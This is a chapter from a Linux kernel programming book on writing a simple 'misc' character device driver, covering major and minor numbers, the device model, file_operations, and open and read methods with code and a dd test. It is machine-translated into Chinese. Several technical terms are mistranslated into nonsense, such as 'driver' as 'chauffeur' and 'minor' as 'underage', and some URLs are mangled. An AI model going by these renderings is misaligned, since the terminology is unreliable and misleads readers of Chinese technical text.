# 一、编写简单的杂项字符设备驱动

毫无疑问，设备驱动程序是一个巨大而有趣的话题。不仅如此，它们可能是我们一直在使用的**可加载内核模块** ( **LKM** )框架最常见的用法。在这里，我们将向您介绍如何在一个名为`misc`的类中编写一些简单而完整的 Linux 字符设备驱动程序；是的，那是杂项的简称。我们希望强调的是，这一章的范围和覆盖面是有限的——在这里，我们不试图深入研究关于 Linux 驱动程序模型及其许多框架的深层细节；相反，我们通过本章的*进一步阅读*部分向您推荐几本关于这个主题的优秀书籍和教程。我们在这里的目的是让您快速熟悉编写简单字符设备驱动程序背后的整体概念。

话虽如此，这本书确实有几章是专门介绍一个司机作者需要知道的。除了这一介绍性章节之外，我们还(详细)介绍了驱动程序作者如何使用硬件输入/输出内存、硬件中断处理(及其许多子主题)以及内核机制，如延迟、定时器、内核线程和工作队列。还详细介绍了各种用户内核通信路径或接口的使用。然后，本书的最后两章将重点介绍对任何内核开发都非常重要的东西，包括驱动程序——内核同步。

我们更愿意编写一个简单的 Linux *字符* *设备驱动程序*而不仅仅是我们“通常的”内核模块的其他原因如下:

*   到目前为止，我们的内核模块已经相当简单，只有`init`和`cleanup`功能，仅此而已。一个设备驱动程序提供*几个*进入内核的入口点；这些是文件相关的系统调用，称为*驱动程序的方法*。所以，我们可以有一个`open()`法、一个`read()`法、一个`write()`法、一个`llseek()`法、一个`[unlocked|compat]_ioctl()`法、一个`release()`法等等。

FYI, all possible "methods" (functions) the driver author can hook into are in this key kernel data structure: `include/linux/fs.h:file_operations` (more on this in the *Understanding the connection between the process, the driver, and the kernel* section).

*   这种情况简直更现实，也更有趣。

在本章中，我们将涵盖以下主题:

*   开始编写简单的杂项字符设备驱动程序
*   将数据从内核复制到用户空间，反之亦然
*   有秘密的杂项司机
*   问题和安全关切

# 技术要求

我假设您已经通过了*前言*部分*来充分利用本书*，并且已经适当地准备了一个运行 Ubuntu 18.04 LTS(或更高的稳定版本)的来宾 VM，并且安装了所有需要的软件包。如果没有，我强烈建议你先做这个。为了最大限度地利用这本书，我强烈建议您首先设置工作空间环境，包括克隆这本书的 GitHub 代码存储库，并以动手的方式进行处理。知识库可以在这里找到:[https://github . com/PacktPublishing/Linux-内核-编程-第 2 部分](https://github.com/PacktPublishing/Linux-Kernel-Programming-Part-2/tree/main/ch1)。

# 开始编写简单的杂项字符设备驱动程序

在本节中，您将首先学习所需的背景材料—了解设备文件(或节点)及其层次结构的基础知识。之后，您将学习——通过实际编写一个非常简单的`misc`字符驱动程序的代码——原始字符设备驱动程序背后的内核框架。接下来，我们将介绍如何通过用户空间应用程序创建设备节点并测试驱动程序。我们开始吧！

## 了解设备基础知识

一些快速的背景是合适的。

一个**设备驱动**是操作系统和外围硬件设备之间的接口。它可以内联编写——即在内核映像文件中编译*——或者更常见的是，作为内核模块在内核源代码树之外编写(我们在配套指南 *Linux 内核编程、* *第 4 章*、*编写您的第一个内核模块—LKMs 第 1 部分*、*第 5 章*、*编写您的第一个内核模块—LKMs 第 2 部分*)中详细介绍了 LKM 框架)。无论哪种方式，驱动程序代码肯定是在操作系统特权下运行的，在内核空间(用户空间设备驱动程序确实存在，但可能会遇到性能问题；虽然在许多情况下很有用，但我们这里不涉及它们。请看*进一步阅读*部分。*

 *为了让用户空间应用程序能够访问内核中的底层设备驱动程序，需要一些输入/输出机制。Unix(以及 Linux)设计是让进程打开一种特殊类型的文件——一个**设备文件**，或者**设备节点**。这些文件通常位于`/dev`目录中，在现代系统中是动态自动填充的。设备节点充当设备驱动程序的入口点。

为了让内核区分设备文件，它在其索引节点数据结构中使用了两个属性:

*   文件类型–字符(字符)或块
*   大调和小调

您将看到**命名空间**—设备类型和`{major#, minor#}`对—形成了一个**层次结构**。设备(以及它们的驱动程序)被组织在内核的树状层次结构中(内核中的驱动程序核心代码负责这个)。首先根据设备类型(块或字符)划分层次结构。其中，每种类型都有一些 *n* 主号，每个主号通过一些 *m* 次号进一步分类；*图 1.1* 展示了这个层次。

现在，块设备和字符设备之间的主要区别在于，块设备具有(内核级)装载的能力，因此成为用户可访问文件系统的一部分。无法安装字符设备；因此，存储设备往往是基于块的。这样想(有点简单但有用):如果(硬件)设备不是存储设备，也不是网络设备，那么它就是字符设备。大量设备属于“字符”类别，包括您典型的 I2C/SPI(集成电路/串行外设接口)传感器芯片(温度、压力、湿度等)、触摸屏、**实时时钟** ( **RTC** )、媒体(视频、相机、音频)、键盘、鼠标等。USB 在内核中形成一个类，用于基础设施支持。USB 设备可以是块设备(笔式驱动器、u 盘)、字符设备(鼠标、键盘、摄像头)或网络(USB 软件狗)设备。

从 2.6 Linux 开始，`{major:minor}`对是 inode 中的单个无符号 32 位数量，一个位掩码(它是`dev_t i_rdev`成员)。在这 32 位中，MSB 12 位代表主要数字，其余 LSB 20 位代表次要数字。快速计算显示，因此最多可以有 2 个 <sup>12 个</sup> = 4，096 个主要数字和 2 个 <sup>20 个</sup>，即每个主要数字有一百万个次要数字。所以，看一下*图 1.1*；在区块层级内，可能有 4，096 个专业，每个专业最多可以有 100 万个未成年人。同样，在角色层级中，可能有 4，096 个专业，每个专业最多可以有 100 万个未成年人:

![](assets/8443be53-6cc9-4d81-9522-26c8b89e34cc.png)

Figure 1.1 – The device namespace or hierarchy

你可能会想:这个*大调:小调*数字对到底是什么意思？把主要数字想象成代表设备的**类** (是 SCSI 磁盘、键盘、**电传终端** ( **tty** )还是**伪终端** ( **pty** )设备、环回设备(是的，这些是伪硬件设备)、操纵杆、磁带设备、帧缓冲器、传感器芯片、触摸屏等等？).确实有各种各样的设备；为了了解有多少，我们强烈建议您查看这里的内核文档:[https://www . kernel . org/doc/Documentation/admin-guide/devices . txt](https://www.kernel.org/doc/Documentation/admin-guide/devices.txt)(这是 Linux 操作系统所有可用设备的官方注册表。它的正式名称是**LANANA**–Linux 名称和号码分配机构！只有这些人可以正式为设备分配设备节点-类型和*主要:次要*编号。

次要数字的含义(解释)完全留给司机作者；内核不干涉。通常，驱动程序会将设备的次要编号解释为代表设备的物理或逻辑实例，或者代表某种功能。(例如，**小型计算机系统接口** ( **SCSI** )驱动程序——块类型，主`#8`——使用次要数字来表示多达 16 个磁盘的逻辑磁盘分区。另一方面，字符专业`#119`由 VMware 的虚拟网络控制驱动程序使用。在这里，未成年人被解释为第一虚拟网络、第二虚拟网络等等。)同样，所有的司机自己给他们的次要数字赋予意义。但是每个好的规则都有例外。这里，规则的例外——内核不解释次要数字——是`misc`类(类型字符，主要`#10`)。它使用次要数字作为二级专业。这将在下一节中介绍。

一个常见的问题是命名空间耗尽。几年前做出的一项决定“收集”了各种各样的字符设备——许多老鼠(不，不是动物界的品种)、传感器、触摸屏等等——到一个名为`misc`或“**杂项**类的类中，该类被分配了字符主号`10`。在`misc`班里面住着很多设备和它们对应的驱动程序。实际上，他们共享同一个主要号码，并依靠唯一的次要号码来识别自己。我们将使用这个类并利用内核的“杂项”框架编写一些驱动程序。

许多设备已经通过 **LANANA (Linux 名称和号码分配机构)**被分配到`misc`字符设备类中。*图 1.2* 显示了来自[https://www . kernel . org/doc/Documentation/admin-guide/devices . txt](https://www.kernel.org/doc/Documentation/admin-guide/devices.txt)的部分截图，显示了前几个`misc`设备、它们分配的次要号码以及简要描述。完整列表请参见参考链接:

![](assets/a7dd011e-66e6-48a7-be40-7e7a4bd61a5e.png)

Figure 1.2 – Partial screenshot of misc devices: char type, major # 10

在*图 1.2* 中，最左边一列有`10 char`，指定其在设备层级的字符类型下被分配了专业`# 10`(图 1.1 )。右边的列是`minor# = /dev/<foo> <description>`的形式；很明显，这是分配的次要编号，后面是(在`=`符号之后)设备节点和一行描述。

## 关于 Linux 设备模型的快速说明

无需赘述，快速浏览一下现代统一的 **Linux 设备模型** ( **LDM** )非常重要。现代 Linux，从 2.6 内核开始，有一个奇妙的特性，LDM，它用一个广泛而大胆的笔画实现了系统和设备的许多目标。在其众多功能中，它创建了一个复杂的层次树，统一了系统组件、所有外围设备及其驱动程序。这个树通过 sysfs 伪文件系统暴露给用户空间(类似于 procfs 如何向用户空间暴露一些内核和进程/线程内部细节)，并且通常安装在`/sys`下。在`/sys`中，你会发现几个目录——你可以把它们看作是 LDM 的“视窗”。在我们的 x86_64 Ubuntu 虚拟机上，我们显示了安装在`/sys`下的 sysfs 文件系统:

```sh
$ mount | grep -w sysfs
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
```

此外，看看里面:

```sh
$ ls -F /sys/
block/ bus/ class/ dev/ devices/ firmware/ fs/ hypervisor/ kernel/ module/ power/
```

将这些目录视为 LDM 的视窗，这是查看系统上设备的不同方式。当然，随着事情的发展，更多的人倾向于进来而不是出去(膨胀方面！).几个不明显的目录现在已经进入了这里。虽然(与 procfs 一样)sysfs 被正式记录为一个**应用程序二进制接口** ( **ABI** )接口，但它随时可能被更改/废弃；现实是，这个系统会随着时间的推移而存在——当然，也会不断发展。

稍微简单一点，LDM 可以被认为拥有——并结合在一起——这些主要组成部分:

*   系统上的**总线**。
*   上面的**装置**。
*   驱动设备的**设备驱动程序**(通常也称为**客户端**驱动程序)。

LDM 的一个基本原则是 ***每一个设备都必须驻留在一个总线*** 上。这可能看起来很明显:USB 设备将在 USB 总线上，PCI 设备在 PCI 总线上，I2C 设备在 I2C 总线上，等等。因此，在`/sys/bus`层级下，您将能够通过总线“看到”所有设备，它们位于:

![](assets/52912a35-54ca-415f-8d53-6e566e2f2054.png)

Figure 1.3 – The different buses or bus driver infrastructure on modern Linux (on an x86_64)

内核的驱动程序内核提供总线驱动程序(通常是内核映像本身的一部分，或者根据需要在启动时自动加载)，这当然会使总线发挥作用。他们的工作是什么？至关重要的是，他们组织并识别他们身上的设备。如果一个新的设备出现(也许你插入了一个笔式驱动器)，USB 总线驱动程序将识别这个事实，并将其绑定到它的(USB 大容量存储)设备驱动程序！一旦成功绑定(许多术语用来描述这一点:绑定、枚举、发现)，内核驱动程序框架调用驱动程序的注册`probe()`方法(函数)。这种探测方法现在可以设置设备、分配资源、IRQ、内存设置、根据需要注册等等。

关于 LDM，需要了解的另一个关键方面是，现代 LDM 司机通常应该做到以下几点:

*   将自己注册到(专门的)内核框架。
*   向总线注册。

它注册到的内核框架取决于您使用的设备类型；例如，驻留在 I2C 总线上的 RTC 芯片的驱动程序将向内核的 RTC 框架(通过`rtc_register_device()` API)和 I2C 总线(内部通过`i2c_register_driver()` API)注册自己。另一方面，PCI 总线上的网络适配器(网卡)的驱动程序通常会将其自身注册到内核的网络基础设施(通过`register_netdev()`应用编程接口)和 PCI 总线(通过`pci_register_driver()`应用编程接口)。注册一个专门的内核框架使你作为驱动作者的工作变得更加容易——内核通常会提供帮助例程(甚至数据结构)来处理输入/输出细节等等。以前面提到的 RTC 芯片驱动为例。

你不需要知道如何通过 I2C 总线与芯片通信的细节，只需按照 I2C 协议的要求，在**串行时钟** ( **SCL** )/ **串行数据** ( **SDA** )线路上一点点敲打出数据。内核 I2C 总线框架为您提供了方便的例程(例如通常使用的`i2c_smbus_*()`API)，让您可以毫不费力地通过总线与相关芯片进行通信！

If you're wondering how to get more information on these driver APIs, here's the good news: the official kernel documentation has plenty to offer. Do look up *The Linux driver implementer’s API guide* here: [https://www.kernel.org/doc/html/latest/driver-api/index.html](https://www.kernel.org/doc/html/latest/driver-api/index.html).

(下面两章我们确实展示了一些司机`probe()`方法的例子；在那之前，请耐心等待。)相反，当设备与总线分离或内核模块卸载(或系统关闭)时，分离会导致驱动程序的`remove()`(或`disconnect()`)方法被调用。在这两者之间，设备通过其驱动程序(总线和客户端)进行工作！

请注意，我们在这里掩盖了许多内在的细节，因为它们超出了本书的范围。重点是让你从概念上了解 LDM。更多详细信息，请参考*进一步阅读*部分的文章和链接。

在这里，我们希望保持我们的驱动程序覆盖非常简单和最小，更多地关注底层基础。因此，我们选择编写一个可能使用最简单内核框架的驱动程序——即`misc`或*杂项*内核框架。在这种情况下，驱动程序甚至不需要向任何总线(驱动程序)显式注册。事实上，它更像这样:我们的驱动程序直接在硬件上工作*，而不需要任何特定的总线基础设施支持。*

In our particular example using the `misc`kernel framework, since we don't explicitly register with any bus (driver), we don't even require the `probe()`/`remove()` methods. This keeps things simple. On the other hand, once you have understood this simplest of drivers, I encourage you to go further and look at writing device drivers with the typical kernel framework registration plus bus driver registration, thus employing the `probe()`/`remove()` methods. A good way to get started is to learn how to write a simple **platform driver**, registering it with the kernel's `misc`framework and the *platform bus*, a pseudo-bus infrastructure that supports devices that do not physically reside on any physical bus (this is more common than you might at first imagine; several peripherals built into a modern **System on Chip** (**SoC**) are not on any physical bus, and thus their drivers are typically platform drivers). To get started, look under the kernel source tree in `drivers/` for code invoking the `platform_driver_register()` API. The official kernel documentation here covers platform devices and drivers: [https://www.kernel.org/doc/html/latest/driver-api/driver-model/platform.html#platform-devices-and-drivers](https://www.kernel.org/doc/html/latest/driver-api/driver-model/platform.html#platform-devices-and-drivers).

As additional help, note the following:
- Do refer to [Chapter 2](2.html), *User-Kernel Communication Pathways*, particularly the *Creating a simple platform device* and *Platform devices* sections.
- An exercise (see the *Questions* section) for this chapter is to write such a driver. I have provided a sample (and very simple) implementation here: `solutions_to_assgn/ch12/misc_plat/`.

然而，我们确实需要内核的`misc`框架支持，因此我们向它注册。接下来，理解这一点也很关键:我们的驱动程序是一个逻辑驱动程序，也就是说，它没有驱动实际的物理设备或芯片。这是很常见的情况(当然，你可以说，这里，正在处理的硬件是内存)。

所以，如果我们要编写一个属于这个`misc`类的 Linux 字符设备驱动程序，我们首先需要向它注册。接下来，我们将需要一个唯一的(未使用的)次要号码。同样，有一种方法可以让内核动态地为我们分配一个空闲的次要号码。以下部分涵盖了这些方面以及更多内容。

## 编写杂项驱动程序代码–第 1 部分

二话没说，我们来看看编写简单骨架字符`misc`设备驱动的代码！(嗯，实际代码的片段；和往常一样，我强烈建议您`git clone`这本书的 GitHub 资源库，详细查看，并自己尝试代码。)

让我们一步一步来看:在我们的第一个设备驱动程序的`init`代码中(使用 LKM 框架)，我们必须首先**用合适的 Linux 内核的框架注册** 我们的驱动程序；在这种情况下，有了`misc` 框架。这是通过`misc_register()`应用编程接口完成的。它需要一个参数，一个指向类型为`miscdevice`的数据结构的指针，该数据结构描述了我们正在设置的各种设备:

```sh
// ch1/miscdrv/miscdrv.c
#define pr_fmt(fmt) "%s:%s(): " fmt, KBUILD_MODNAME, __func__
[...]
#include <linux/miscdevice.h>
#include <linux/fs.h>              /* the fops, file data structures */
[...]

static struct miscdevice llkd_miscdev = {
    .minor = MISC_DYNAMIC_MINOR, /* kernel dynamically assigns a free minor# */
    .name = "llkd_miscdrv",      /* when misc_register() is invoked, the kernel
             * will auto-create a device file as /dev/llkd_miscdrv ;
             * also populated within /sys/class/misc/ and /sys/devices/virtual/misc/ */
    .mode = 0666,            /* ... dev node perms set as specified here */
    .fops = &llkd_misc_fops, /* connect to this driver's 'functionality' */
};

static int __init miscdrv_init(void)
{
    int ret;
    struct device *dev;

    ret = misc_register(&llkd_miscdev);
    if (ret != 0) {
        pr_notice("misc device registration failed, aborting\n");
        return ret;
    }
    [ ... ]
```

在`miscdevice`结构实例中，我们执行以下操作:

1.  我们将`minor`字段设置为`MISC_DYNAMIC_MINOR`。这具有请求内核动态分配给我们一个可用的次要号码的效果(一旦注册成功，这个`minor`字段将被填充分配的实际次要号码)。
2.  我们初始化`name`字段。注册成功后，内核框架会代表我们自动创建一个设备节点(形式为`/dev/<name>`)！不出所料，类型为字符，主数字为`10`，次数字为动态赋值。这是使用内核框架的(部分)优势；否则，我们可能不得不自己设计一种方法来创建设备节点；顺便说一下，`mknod(1)`实用程序可以在以 root 权限调用时创建设备文件(或者您具有`CAP_MKNOD`功能)；它通过调用`mknod(2)`系统调用工作！
3.  设备节点的权限将被设置为您将`mode`字段初始化为的任何值(这里，我们特意通过`0666`八进制值保持它的许可性和可读写性)。
4.  我们将把文件操作(`fops`)结构成员的讨论推迟到下一节。

所有`misc`驱动程序都是字符类型，使用相同的主编号(`10`，但当然需要唯一的次编号。

### 理解进程、驱动程序和内核之间的联系

在这里，我们将深入研究在 Linux 上成功注册字符设备驱动程序的内核内部。实际上，您将开始理解底层原始字符驱动程序框架的工作原理。

`file_operations`结构，或通常所说的 **fops** (发音为 *eff-opps* )对于驾驶员作者至关重要；fops 结构的大多数成员都是函数指针——把它们想象成**虚拟方法** *。*它们代表所有可能在(设备)文件上发出的文件相关系统调用。所以，它有`open` *、* `read` *、* `write` *、* `poll` *、* `mmap` *、* `release` *、*等多个成员(其中大部分是函数指针)。这里显示了这个关键数据结构的一些成员:

```sh
// include/linux/fs.h struct file_operations {
    struct module *owner;
    loff_t (*llseek) (struct file *, loff_t, int);
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
[...]
    __poll_t (*poll) (struct file *, struct poll_table_struct *);
    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
    int (*mmap) (struct file *, struct vm_area_struct *);
    unsigned long mmap_supported_flags;
    int (*open) (struct inode *, struct file *);
    int (*flush) (struct file *, fl_owner_t id); 
    int (*release) (struct inode *, struct file *);
[...]
    int (*fadvise)(struct file *, loff_t, loff_t, int);
} __randomize_layout;
```

驱动程序作者(或底层内核框架)的一项关键工作是填充这些函数指针，从而将它们链接到驱动程序中的实际代码。当然，你不必实现每一个功能；详见*处理不支持的方法*部分。

现在，让我们假设您已经编写了驱动程序来为一些`f_op`方法设置函数。一旦您的驱动程序注册到内核，通常是通过内核框架，当任何用户空间进程(或线程)打开注册到该驱动程序的设备文件时，内核**虚拟文件系统交换机** ( **VFS** )层将接管。无需深入讨论细节，只需说 VFS 为设备文件分配并初始化该进程的打开文件数据结构(`struct file`)。现在，回忆一下我们`struct miscdevice`初始化中的最后一行；是这样的:

```sh
   .fops = &llkd_misc_fops, /* connect to this driver's 'functionality' */
```

这一行代码有一个关键作用:它将进程的文件操作指针(在进程的打开文件结构中)与设备驱动程序的文件操作结构联系起来。*功能–驱动程序将执行的操作–*现在已经为此设备文件设置好了！

让我们充实一下。现在(在你的驱动程序初始化之后)，一个用户模式进程打开你的驱动程序的设备文件，通过对它发出`open(2)`系统调用。假设一切顺利(也应该如此)，这个过程现在通过内核深处的`file_operations`结构指针连接到您的驱动程序。这里有一个关键点:在`open(2)`系统调用成功返回，并且进程在那个(设备)文件上发出任何与文件相关的系统调用`foo()`之后，内核 VFS 层将以面向对象的方式进行(我们在本书中已经指出了这一点！)，盲目而笃信地调用注册 **`fops->foo()`** 的方法！用户空间进程打开的文件，通常是`/dev`中的设备文件，内部由`struct file`元数据结构表示(指向这个的指针`struct file *filp`被传递给驱动程序)。因此，就伪代码而言，当用户空间发出一个与文件相关的系统调用`foo()`时，这就是内核 VFS 层有效做的事情:

```sh
/* pseudocode: kernel VFS layer (not the driver) */
if (filp->f_op->foo)
    filp->f_op->foo(); /* invoke the 'registered' driver method corresponding to 'foo()' */
```

因此，如果打开设备文件的用户空间进程调用其上的`read(2)`系统调用，内核 VFS 将调用`filp->f_op->read(...)`，实际上将控制重定向到设备驱动程序。你作为设备驱动作者的工作就是提供`read(2)`的功能！所有其他与文件相关的系统调用也是如此。本质上，这就是 Unix 和 Linux 如何实现众所周知的*如果这不是一个过程，这是一个文件设计*原则。

#### 处理不支持的方法

您不必填充`f_ops`结构的每个成员，只需填充您的驱动程序支持的成员。如果是这种情况，并且您已经填充了一些方法，但是遗漏了`poll`方法，并且用户空间进程在您的设备上调用`poll(2)`(也许您已经记录了它不应该被调用的事实，但是如果它调用了呢？)，那么会发生什么呢？在这种情况下，内核 VFS 检测到`foo`指针(在本例中为`poll`)为`NULL`，返回一个适当的负整数(实际上遵循相同的`0` / `-E`协议)。`glibc`代码会将其乘以`-1`，并将调用过程的`errno`变量设置为该值，表示系统调用失败。

需要注意两点:

*   很多时候，VFS 返回的负值并不是很直观。(例如，如果您已经将`f_op`的`read()`功能指针设置为`NULL`，则 VFS 会将`EINVAL`值发回。这让用户空间流程认为`read(2)`失败是因为一个`"Invalid argument"`错误，根本不是这样！)
*   `lseek(2)`系统调用让驱动程序寻找文件中的指定位置——当然，这里指的是设备中。内核故意将`f_op`函数指针命名为`llseek`(注意两个“`l`)。这只是提醒你`lseek`的返回值可以是 64 位(长)量。现在，对于大多数硬件设备来说，`lseek`值没有意义，因此大多数驱动程序不需要实现它(不像文件系统)。现在的问题是这样的:即使你不支持`lseek`(你已经将`f_op`的`llseek`成员设置为`NULL`，它仍然会返回一个随机正值，从而导致用户模式 app 错误地认为它成功了。因此，如果您没有实现`lseek`，您需要执行以下操作:
    1.  明确将`llseek`设置为特殊的`no_llseek`值，这将导致故障值(`-ESPIPE`；`illegal seek`)待退回。
    2.  在这种情况下，您还需要在驱动程序的`open()`方法中调用`nonseekable_open()`函数，指定文件不可查找(这在`open()`方法中通常称为:`return nonseekable_open(struct inode *inode, struct file *filp);`)。细节，以及更多，都包含在这里的 LWN 文章:[https://lwn.net/Articles/97154/](https://lwn.net/Articles/97154/)。你可以在这里看到这对许多司机造成的变化:[https://lwn.net/Articles/97180/](https://lwn.net/Articles/97180/)。

如果您不支持某个函数，一个合适的返回值是`-ENOSYS`，这将使用户模式进程看到错误`Function not implemented`(当它调用`perror(3)`或`strerror(3)`库 API 时)。这是明确的，毫不含糊的；用户空间开发人员现在将理解您的驱动程序不支持此功能。因此，实现驱动程序的一种方法是设置指向所有文件操作方法的指针，并在驱动程序中为所有与文件相关的系统调用(T4 方法)编写一个例程。对于你支持的，写代码；对于没有实现的，只需返回值`-ENOSYS`。虽然做起来有点费力，但它会给用户空间带来明确的返回值。

## 编写杂项驱动程序代码–第 2 部分

有了这些知识，再来看看`ch1/miscdrv/miscdrv.c`的`init`代码。您将看到，正如上一节所述，我们已经将`miscdev`结构的`fops`成员初始化为`file_operations`结构，从而设置了驱动程序的功能。相关的代码片段(来自我们的驱动程序)如下:

```sh
static const struct file_operations llkd_misc_fops = {
    .open = open_miscdrv,
    .read = read_miscdrv,
    .write = write_miscdrv,
    .release = close_miscdrv,
};

static struct miscdevice llkd_miscdev = {
    [ ... ]
    .fops = &llkd_misc_fops, /* connect to this driver's 'functionality' */
};
```

所以，现在你可以看到:当一个打开了我们的设备文件的用户空间进程(或线程)调用，比如说`read(2)`系统调用时，内核 VFS 层将跟随指针(一般来说，`filp->f_op->foo()`)并调用函数，`read_miscdrv()`，实际上将控制权移交给设备驱动程序！下一节将详细介绍如何编写 read 方法。

继续我们简单的`misc`驾驶员的`init` 代码:

```sh
    [ ... ] 
    /* Retrieve the device pointer for this device */
    dev = llkd_miscdev.this_device;
    pr_info("LLKD misc driver (major # 10) registered, minor# = %d,"
            " dev node is /dev/%s\n", llkd_miscdev.minor, llkd_miscdev.name);
    dev_info(dev, "sample dev_info(): minor# = %d\n", llkd_miscdev.minor);
    return 0;        /* success */
}
```

我们的驱动程序检索一个指向`device`结构的指针——这是每个驱动程序都需要的东西。在`misc`内核框架中，它在我们的`miscdevice`结构的`this_device`成员中可用。

接下来，`pr_info()`显示动态获得的次数值。`dev_info()`帮手套路更有意思:作为一个司机作者，你在发射`printk`的时候预计会用到这些`dev_xxx()`帮手；它还会为有关设备的有用信息添加前缀。`dev_xxx()`和`pr_xxx()`助手之间唯一的语法差异是前者的第一个参数是指向设备结构的指针。

好吧，让我们把手弄脏！我们构建驱动程序并将其放入内核空间(我们使用我们的`lkm`助手脚本来这样做):

![](assets/eef5c47b-24ea-480d-9ca9-c520c1f96fb0.png)

Figure 1.4 – Screenshot of building and loading our miscdrv.ko skeleton misc driver on an x86_64 Ubuntu VM

(顺便说一下，正如你在*图 1.4* 中看到的，我在一个更新的发行版上试用了这个`misc`驱动程序:运行 5.4.0-58 通用内核的 Ubuntu 20.04.1 LTS。)注意*图 1.4* 底部的两张图；第一个是通过`pr_info()`(前缀为`pr_fmt()`宏内容，如配套指南 *Linux 内核编程-* *第 4 章，编写您的第一个内核模块- LKMs 第 1 部分*部分*通过 pr_fmt 宏*标准化 printk 输出中所述)。第二个打印是通过`dev_info()`助手例程发出的——它的前缀是`misc llkd_miscdrv`，表示它源自内核的`misc`框架，特别是`llkd_miscdrv`设备！(`dev_xxx()`套路多才多艺；根据他们乘坐的公共汽车，他们会显示各种细节。这对于调试和日志记录非常有用。我们重复一遍:建议你在编写驱动时使用`dev_*()`例程。)还可以看到`/dev/llkd_miscdrv`设备节点确实创建了，预期类型(字符)和主副对(这里是 10 和 56)。

## 编写杂项驱动程序代码–第 3 部分

现在`init`代码完成，驱动功能已经通过文件操作结构设置好，驱动注册到内核`misc`框架。那么，接下来会发生什么？嗯，实际上没有什么，直到一个进程打开设备文件(与您的驱动程序相关联)并执行某种输入/输出(输入/输出，即读/写)。

因此，让我们假设一个用户模式进程(或线程)在驱动程序的设备节点上发出`open(2)`系统调用(回想一下，当驱动程序向内核的`misc`框架注册自己时，设备节点已经自动创建)。最重要的是，正如您在*了解进程、驱动程序和内核*之间的联系一节中所学的，对于在您的设备节点上发出的任何与文件相关的系统调用，VFS 本质上将调用驱动程序的(`f_op`)注册方法。因此，在这里，VFS 将这样做:`filp->f-op->open()`，从而在我们的`file_operations`结构内调用我们的驾驶员的`open`方法，这就是`open_miscdrv()`功能！

但是你这个驱动作者应该如何实现你的驱动的`open`方法的这个代码呢？重点是这个:你的`open`功能**的签名应该和`file_operation`结构`open`的签名一样**；事实上，任何函数都是如此。因此，我们这样实现`open_miscdrv()`功能:

```sh
/*
 * open_miscdrv()
 * The driver's open 'method'; this 'hook' will get invoked by the kernel VFS
 * when the device file is opened. Here, we simply print out some relevant info.
 * The POSIX standard requires open() to return the file descriptor on success;
 * note, though, that this is done within the kernel VFS (when we return). So,
 * all we do here is return 0 indicating success.
 * (The nonseekable_open(), in conjunction with the fop's llseek pointer set to
 * no_llseek, tells the kernel that our device is not seek-able).
 */
static int open_miscdrv(struct inode *inode, struct file *filp)
{
    char *buf = kzalloc(PATH_MAX, GFP_KERNEL);

    if (unlikely(!buf))
        return -ENOMEM;
    PRINT_CTX(); // displays process (or atomic) context info
    pr_info(" opening \"%s\" now; wrt open file: f_flags = 0x%x\n",
        file_path(filp, buf, PATH_MAX), filp->f_flags);
    kfree(buf);
    return nonseekable_open(inode, filp);
}
```

请注意我们的`open`例程的签名`open_miscdrv()`函数如何与`f_op`结构的`open`函数指针精确匹配(您可以在[https://酏. boot in . com/Linux/v 5.4/source/include/Linux/fs . h # l 1814](https://elixir.bootlin.com/linux/v5.4/source/include/linux/fs.h#L1814)上查找 5.4 Linux 的`file_operations`结构)。

在这个简单的驱动程序中，在我们的`open`方法中，我们真的没有太多的事情要做。我们通过`kzalloc()`为一个缓冲区(保存我们设备的路径名)分配一些内存，发布我们的`PRINT_CTX()`宏(在`convenient.h`头中)来显示当前上下文——当前打开设备的过程。然后我们发出一个`printk`(通过`pr_info()`)显示一些 VFS 图层的细节(路径名和开放标志值)；您可以通过使用便利 API `file_path()`获得文件的路径名，就像我们在这里做的那样(为此，我们需要分配并在使用后释放一个内核内存缓冲区)。然后，由于我们不支持这个驱动程序中的搜索，我们调用`nonseekable_open()`应用编程接口(如*处理不支持的方法*部分所述)。

设备文件上的`open(2)`系统调用应该成功。用户模式进程现在将有一个有效的文件描述符——一个打开文件的句柄(这里实际上是一个设备节点)。现在，假设用户模式进程想要从硬件中读取数据；因此，它发出`read(2)`系统调用。正如已经解释的，内核 VFS 现在将自动调用我们的驱动程序的读取方法，`read_miscdrv()`。同样，它的签名完全模仿了`file_operations`数据结构中的读取函数签名。下面是我们的驱动程序读取方法的简单代码:

```sh
/*
 * read_miscdrv()
 * The driver's read 'method'; it has effectively 'taken over' the read syscall
 * functionality! Here, we simply print out some info.
 * The POSIX standard requires that the read() and write() system calls return
 * the number of bytes read or written on success, 0 on EOF (for read) and -1 (-ve errno)
 * on failure; we simply return 'count', pretending that we 'always succeed'.
 */
static ssize_t read_miscdrv(struct file *filp, char __user *ubuf, size_t count, loff_t *off)
{
        pr_info("to read %zd bytes\n", count);
        return count;
}
```

前面的评论不言自明。在其中，我们发出`pr_info()`，显示用户空间进程想要读取的字节数。然后，我们简单地返回读取的字节数，这意味着成功！事实上，我们(基本上)什么也没做。其余的驱动方法非常相似。

## 测试我们简单的杂项驱动程序

让我们测试一下我们真正简单的骨架`misc`角色驱动(在`ch1/miscdrv`目录中；我们假设您已经构建并插入了它，如*图 1.4* 所示。我们通过发布`open(2)`、`read(2)`、`write(2)`、`close(2)`系统调用来测试；我们究竟如何才能做到这一点？我们总是可以写一个小的 C 程序来精确地做到这一点，但是更简单的方法是使用有用的`dd(1)`“磁盘复制器”实用程序。我们这样使用它:

```sh
dd if=/dev/llkd_miscdrv of=readtest bs=4k count=1
```

内部`dd`打开文件，我们通过`if=`将其作为参数(`/dev/llkd_miscdrv`)传递(这里是第一个参数传递给`dd`；`if=`指定输入文件)，它将从中读取(当然是通过`read(2)`系统调用)。输出要写入参数`of=`指定的文件(第二个参数为`dd`，是一个名为`readtest`的常规文件)；`bs`指定执行输入/输出的块大小，`count`是执行输入/输出的次数。执行所需的输入/输出后，`dd`过程将会`close(2)`文件。这个顺序反映在内核日志中(*图 1.5* ):

![](assets/9c0a7520-4795-4889-b8c2-6117c7f1b00f.png)

Figure 1.5 – Screenshot showing us minimally testing our miscdrv driver's read method via dd(1)

